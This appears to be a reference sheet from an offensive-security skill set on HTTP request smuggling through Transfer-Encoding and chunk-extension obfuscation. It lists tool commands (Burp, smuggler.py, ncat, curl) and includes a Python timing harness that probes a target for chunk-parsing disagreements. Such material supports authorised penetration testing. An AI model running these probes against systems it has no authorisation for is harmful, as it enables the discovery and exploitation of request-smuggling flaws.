# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`http-request-smuggling-te-te-and-obfuscation`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `Burp Suite Repeater` | `Disable Content-Length auto-update and hand-edit the chunk lines, then send on a single connection` | Keep the obfuscated terminators and extensions byte-exact so the tested tier, not Burp, frames the body | Cross-platform |
| `smuggler.py` | `python3 smuggler.py -u https://target.example/ --exit-early` | Run the obfuscated TE and chunk permutations with timing differentials against an authorised host | Linux, macOS, Windows |
| `netcat` | `ncat --ssl target.example 443 < chunk-probe.txt` | Send the byte-exact chunk-framing probe saved in chunk-probe.txt, including bare-LF terminators a higher-level client would rewrite | Linux, macOS |
| `curl` | `curl -sS -o /dev/null -w '%{time_total}\n' --max-time 20 -H 'Transfer-Encoding: chunked' -X POST --data-binary @chunk.txt https://target.example/` | Baseline a clean chunked POST so the obfuscated probe's divergence is measurable | Cross-platform |

## Minimal Script Shape

A chunk-obfuscation differential harness: it times a clean CRLF-chunked POST against one whose chunk line carries an extension, on separate connections to the same host, and flags a likely TERM.EXT or EXT.TERM disagreement when only the extension variant stalls.

```python
import socket
import ssl
import time

HOST = "target.example"
PORT = 443

def timed(raw):
    ctx = ssl.create_default_context()
    start = time.monotonic()
    with socket.create_connection((HOST, PORT), timeout=15) as sock:
        with ctx.wrap_socket(sock, server_hostname=HOST) as tls:
            tls.sendall(raw.encode())
            try:
                tls.recv(64)
            except socket.timeout:
                pass
    return time.monotonic() - start

clean = ("POST / HTTP/1.1\r\nHost: %s\r\n"
         "Transfer-Encoding: chunked\r\n\r\n0\r\n\r\n" % HOST)
ext = ("POST / HTTP/1.1\r\nHost: %s\r\n"
       "Transfer-Encoding: chunked\r\n\r\n0;pad=0\r\n\r\n" % HOST)
base = timed(clean)
probe = timed(ext)
print({"clean_s": round(base, 2), "extension_s": round(probe, 2),
       "likely_term_ext": probe > base * 3 + 1})
```
